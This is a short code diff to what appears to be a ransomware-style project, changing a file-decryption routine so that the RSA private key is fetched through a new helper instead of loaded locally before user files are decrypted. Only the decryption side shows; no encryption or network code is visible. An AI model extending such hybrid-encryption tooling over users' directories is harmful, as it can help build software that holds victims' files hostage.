@@ -4,6 +4,7 @@ from cryptography.hazmat.primitives import serialization, hashes
 from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
 from cryptography.hazmat.primitives import padding as sym_padding
 from cryptography.hazmat.backends import default_backend
+from RSA_Key_Handling import fetch_and_load_private_key
 from Variables import system_dirs
 
 ####################################################################################################################
@@ -64,7 +65,7 @@ def decrypt_user_files(root_path, aes_key):
                 continue
 
 def decrypt_all_files():
-    private_key = load_rsa_private_key()
+    private_key = fetch_and_load_private_key() # Loading the private key into memory
     encrypted_aes_key = load_encrypted_aes_key()
     aes_key = decrypt_aes_key_with_rsa(encrypted_aes_key, private_key)
 
